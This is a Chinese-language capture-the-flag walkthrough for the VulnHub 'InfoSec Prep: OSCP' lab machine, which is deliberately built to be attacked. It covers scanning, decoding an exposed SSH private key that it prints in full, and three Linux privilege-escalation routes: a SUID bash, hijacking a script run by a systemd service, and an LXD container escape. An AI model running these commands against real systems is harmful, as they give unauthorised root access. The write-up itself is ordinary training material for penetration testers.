# InfoSec Prep: OSCP

2024-5-18 https://www.vulnhub.com/entry/infosec-prep-oscp,508/

difficulty: easy

## IP

192.168.5.21

## Scan

Open Port -> 22,80,33060

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91ba0dd43905e31355578f1b4690dbe4 (RSA)
|   256 0f35d1a131f2f6aa75e81701e71ed1d5 (ECDSA)
|_  256 aff153ea7b4dd7fad8de0df228fc86d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-title: OSCP Voucher &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.4.2
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
```

80 web 页面上是一个 wordpress 搭建的网站，目录扫描，看看有什么内容：

```
http://192.168.5.21/index.php            (Status: 301) [Size: 0] [--> http://192.168.5.21/]
http://192.168.5.21/wp-content           (Status: 301) [Size: 317] [--> http://192.168.5.21/wp-content/]
http://192.168.5.21/wp-login.php         (Status: 200) [Size: 4795]
http://192.168.5.21/license.txt          (Status: 200) [Size: 19915]
http://192.168.5.21/wp-includes          (Status: 301) [Size: 318] [--> http://192.168.5.21/wp-includes/]
http://192.168.5.21/javascript           (Status: 301) [Size: 317] [--> http://192.168.5.21/javascript/]
http://192.168.5.21/readme.html          (Status: 200) [Size: 7278]
http://192.168.5.21/robots.txt           (Status: 200) [Size: 36]
http://192.168.5.21/wp-trackback.php     (Status: 200) [Size: 135]
http://192.168.5.21/secret.txt           (Status: 200) [Size: 3502]
http://192.168.5.21/wp-admin             (Status: 301) [Size: 315] [--> http://192.168.5.21/wp-admin/]
http://192.168.5.21/xmlrpc.php           (Status: 405) [Size: 42]
http://192.168.5.21/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.5.21/wp-login.php?action=register]
```

/robots.txt 提示：Disallow: /secret.txt

http://192.168.5.21/secret.txt 是一个 base64 编码，进行解码，是一个 rsa 私钥：

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

现在需要找到用户名，根据网站首页的提示：Oh yea! Almost forgot the only user on this box is “oscp”. 或者对上面的私钥密文再次进行 base64 解码，在最后就能看到用户名信息：oscp@oscp

现在我们使用 oscp 用户进行登陆。

进行权限升级，发现 /usr/bin/bash 设置了 suid:

```
-bash-5.0$ ls -al /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /usr/bin/bash
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# cd /root
bash-5.0# ls
fix-wordpress  flag.txt  snap
bash-5.0# cat flag.txt
d73b04b0e696b0945283defa3eee4538
```

第 2 种获得 root 权限的方式：看到 oscp 目录中有一个 ip 文件，可能是在其他地方调用的，让我们查看/etc/crontab 中没有看到，/etc/cron.d 中也没有发现，看看 service 中是否有：/etc/systemd/system,找到了一个服务 ip-update.service：

```
[Unit]
Description=Write current ip addr to /etc/issue

[Service]
Type=oneshot
RemainAfterExit=true
ExecStart=/home/oscp/ip

[Install]
WantedBy=multi-user.target
```

知道这个任务调用了 oscp 目录中的 ip 程序，所以我们可以进行替换：

```
mv ip ip.bak
touch ip
chmod +x ip

-bash-5.0$ cat ip
#!/bin/sh
cp /bin/bash /home/oscp/oscpbash
chmod +xs /home/oscp/oscpbash
```

然后将服务器重启，oscp 目录就有了 oscpbash suid 程序，执行 ./oscpbash -p 就能获得 root 权限。

第 3 种获得 root 权限的方式：看到 oscp 用户数据 lxd 用户组，可以用下面这个链接中的方法进行利用：https://www.hackingarticles.in/lxd-privilege-escalation/

访问 https://github.com/saghul/lxd-alpine-builder，将 alpine-v3.13-x86_64-20210218_0139.tar.gz 下载到目标机器 /tmp 目录中。

找到 lxc 的文件位置：

```
-bash-5.0$ find / -name lxc 2>/dev/null

/snap/lxd/16100/bin/lxc
/snap/lxd/16100/commands/lxc
/snap/lxd/16100/lxc
/snap/lxd/16044/bin/lxc
/snap/lxd/16044/commands/lxc
/snap/lxd/16044/lxc
/snap/bin/lxc
/usr/share/bash-completion/completions/lxc
```

执行命令 /snap/bin/lxc ，导入镜像：

```
/snap/bin/lxc image import /tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lxcimage

/snap/bin/lxc image list

/snap/bin/lxc init lxcimage ignite -c security.privileged=true  # 这句话执行时会报错，提示先创建pool，就按照下面代码执行

/snap/bin/lxc storage create pool dir
/snap/bin/lxc profile device add default root disk path=/ pool=pool
/snap/bin/lxc init lxcimage ignite -c security.privileged=true
/snap/bin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true
/snap/bin/lxc start ignite
/snap/bin/lxc exec ignite /bin/sh
```

执行完毕后，/mnt/root 目录中将挂载宿主机的全部文件，我们可以直接进入/mnt/root/root 目录查看 flag 信息。
